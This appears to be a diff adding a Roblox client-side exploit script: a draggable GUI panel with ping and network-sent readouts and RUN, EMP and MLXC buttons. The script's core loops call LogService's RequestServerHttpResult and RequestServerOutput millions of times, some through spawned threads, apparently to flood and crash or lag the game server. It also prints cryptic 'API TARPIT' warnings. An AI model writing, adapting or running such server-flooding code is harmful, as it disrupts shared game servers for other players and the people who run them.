@@ -1,0 +1,251 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local PING_V = Instance.new("TextLabel")
+local UIGradient = Instance.new("UIGradient")
+local CURRENT_P = Instance.new("TextLabel")
+local RUN = Instance.new("TextButton")
+local SENT_V = Instance.new("TextLabel")
+local CURRENT_S = Instance.new("TextLabel")
+local EMP = Instance.new("TextButton")
+local MLX = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.0304731429, 0, 0.295825779, 0)
+Frame.Size = UDim2.new(0, 184, 0, 224)
+
+PING_V.Name = "PING_V"
+PING_V.Parent = Frame
+PING_V.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PING_V.BackgroundTransparency = 1.000
+PING_V.Position = UDim2.new(0, 15, 0, 23)
+PING_V.Size = UDim2.new(0, 144, 0, 22)
+PING_V.Font = Enum.Font.Roboto
+PING_V.Text = "476<font color='rgb(89,89,89)'>.00</font>"
+PING_V.TextColor3 = Color3.fromRGB(255, 255, 255)
+PING_V.TextSize = 18.000
+PING_V.TextXAlignment = Enum.TextXAlignment.Left
+PING_V.RichText = true
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(50, 50, 50)), ColorSequenceKeypoint.new(0.30, Color3.fromRGB(50, 50, 50)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(21, 21, 21))}
+UIGradient.Offset = Vector2.new(0, -0.100000001)
+UIGradient.Rotation = 43.887599945068
+UIGradient.Parent = Frame
+
+CURRENT_P.Name = "CURRENT_P"
+CURRENT_P.Parent = Frame
+CURRENT_P.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CURRENT_P.BackgroundTransparency = 1.000
+CURRENT_P.Position = UDim2.new(0, 15, 0, 45)
+CURRENT_P.Size = UDim2.new(0, 144, 0, 13)
+CURRENT_P.Font = Enum.Font.Roboto
+CURRENT_P.Text = "Current ping"
+CURRENT_P.TextColor3 = Color3.fromRGB(108, 108, 108)
+CURRENT_P.TextSize = 9.000
+CURRENT_P.TextXAlignment = Enum.TextXAlignment.Left
+
+RUN.Name = "RUN"
+RUN.Parent = Frame
+RUN.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+RUN.BackgroundTransparency = 1.000
+RUN.BorderSizePixel = 0
+RUN.Position = UDim2.new(0.804347813, 0, 0.0357143022, 0)
+RUN.Size = UDim2.new(0, 30, 0, 28)
+RUN.Font = Enum.Font.SourceSansBold
+RUN.Text = "RUN"
+RUN.TextColor3 = Color3.fromRGB(255, 255, 255)
+RUN.TextSize = 14.000
+RUN.TextXAlignment = Enum.TextXAlignment.Left
+
+SENT_V.Name = "SENT_V"
+SENT_V.Parent = Frame
+SENT_V.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SENT_V.BackgroundTransparency = 1.000
+SENT_V.Position = UDim2.new(0, 15, 0, 70)
+SENT_V.Size = UDim2.new(0, 144, 0, 22)
+SENT_V.Font = Enum.Font.Roboto
+SENT_V.Text = "23<font color='rgb(89,89,89)'>.00</font>"
+SENT_V.TextColor3 = Color3.fromRGB(255, 255, 255)
+SENT_V.TextSize = 18.000
+SENT_V.TextXAlignment = Enum.TextXAlignment.Left
+SENT_V.RichText = true
+
+CURRENT_S.Name = "CURRENT_S"
+CURRENT_S.Parent = Frame
+CURRENT_S.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CURRENT_S.BackgroundTransparency = 1.000
+CURRENT_S.Position = UDim2.new(0, 15, 0, 92)
+CURRENT_S.Size = UDim2.new(0, 144, 0, 13)
+CURRENT_S.Font = Enum.Font.Roboto
+CURRENT_S.Text = "Current sent"
+CURRENT_S.TextColor3 = Color3.fromRGB(108, 108, 108)
+CURRENT_S.TextSize = 9.000
+CURRENT_S.TextXAlignment = Enum.TextXAlignment.Left
+
+EMP.Name = "EMP"
+EMP.Parent = Frame
+EMP.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+EMP.BackgroundTransparency = 1.000
+EMP.BorderSizePixel = 0
+EMP.Position = UDim2.new(0.081521742, 0, 0.821428597, 0)
+EMP.Size = UDim2.new(0, 31, 0, 28)
+EMP.Font = Enum.Font.Roboto
+EMP.Text = "EMP"
+EMP.TextColor3 = Color3.fromRGB(194, 162, 3)
+EMP.TextSize = 14.000
+EMP.TextXAlignment = Enum.TextXAlignment.Left
+
+MLX.Name = "MLX"
+MLX.Parent = Frame
+MLX.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+MLX.BackgroundTransparency = 1.000
+MLX.BorderSizePixel = 0
+MLX.Position = UDim2.new(0.282608688, 0, 0.821428597, 0)
+MLX.Size = UDim2.new(0, 31, 0, 28)
+MLX.Font = Enum.Font.Roboto
+MLX.Text = "MLXC"
+MLX.TextColor3 = Color3.fromRGB(255, 255, 255)
+MLX.TextSize = 14.000
+MLX.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Scripts:
+
+local function XFCW_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	repeat wait() until game:IsLoaded()
+	
+	
+	local holder = script.Parent.Frame;
+	local run = holder.RUN;
+	local emp = holder.EMP;
+	local mlx = holder.MLX;
+	
+	local rs = game:GetService('RunService')
+	
+	local st = {
+		ping=holder.PING_V,
+		sent=holder.SENT_V
+	}
+	
+	local states = {
+		running=false,
+		mode='emp'
+	}
+	
+	local sthandler = game.Stats.PerformanceStats
+	function getStat(t)
+	    local sta = t:lower()
+	    if sta == 'ping' then
+			return sthandler.Ping:GetValueString():split(".")[1]
+		elseif sta == 'sent' then
+			return sthandler.NetworkSent:GetValueString():split(".")[1]
+		end
+	end
+	
+	run.MouseButton1Click:Connect(function()
+		if states.running == true then 
+	 		states.running = false
+	        run.TextColor3 = Color3.fromRGB(255, 255, 255) 
+		else
+	 		states.running = true
+			run.TextColor3 = Color3.fromRGB(194, 162, 3)
+		end
+	end)
+	
+	emp.MouseButton1Click:Connect(function()
+		if states.mode ~= 'emp' then
+			states.mode = 'emp'
+			warn('INFO*S->P CONTENT NIL - RESORTING TO APX')
+			emp.TextColor3 = Color3.fromRGB(194, 162, 3)
+	        mlx.TextColor3 = Color3.fromRGB(255, 255, 255) 
+		end
+	end)
+	
+	mlx.MouseButton1Click:Connect(function()
+		if states.mode ~= 'mlx' then
+			states.mode = 'mlx'
+			warn('INFO*S->P STARTING API TARPIT - MXL_CONTENTPROBE MODE')
+			mlx.TextColor3 = Color3.fromRGB(194, 162, 3)
+	        emp.TextColor3 = Color3.fromRGB(255, 255, 255) 
+		end
+	end)
+	
+	
+	rs.RenderStepped:Connect(function()
+	    local mode = states.mode
+	    PING_V.Text = getStat('ping').."<font color='rgb(89,89,89)'>.00</font>"
+	    SENT_V.Text = getStat('sent').."<font color='rgb(89,89,89)'>.00</font>"
+		if states.running then
+			if mode == 'mlx' then
+				for ie = 1,400 do
+					for i = 1, 400*10 do
+					    spawn(function()
+	            		    game:GetService("LogService"):RequestServerHttpResult()
+	            		    game:GetService("LogService"):RequestServerOutput()
+	            		end)
+					end
+				end
+				states.running = false;
+	            run.TextColor3 = Color3.fromRGB(255,255,255)
+			end
+			if mode == 'emp' then
+				for i = 1, 100 * 10000 do 
+	 			   game:GetService("LogService"):RequestServerHttpResult()
+	 			   game:GetService("LogService"):RequestServerOutput()
+				end
+				states.running = false;
+	            run.TextColor3 = Color3.fromRGB(255,255,255)
+			end
+		end
+	end)
+end
+coroutine.wrap(XFCW_fake_script)()
+local UIS = game:GetService("UserInputService")
+function dragify(Frame)
+    dragToggle = nil
+    local dragSpeed = 0
+    dragInput = nil
+    dragStart = nil
+    local dragPos = nil
+    function updateInput(input)
+        local Delta = input.Position - dragStart
+        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+    end
+    Frame.InputBegan:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = Frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragToggle = false
+                end
+            end)
+        end
+    end)
+    Frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if input == dragInput and dragToggle then
+            updateInput(input)
+        end
+    end)
+end
+
+dragify(Frame)
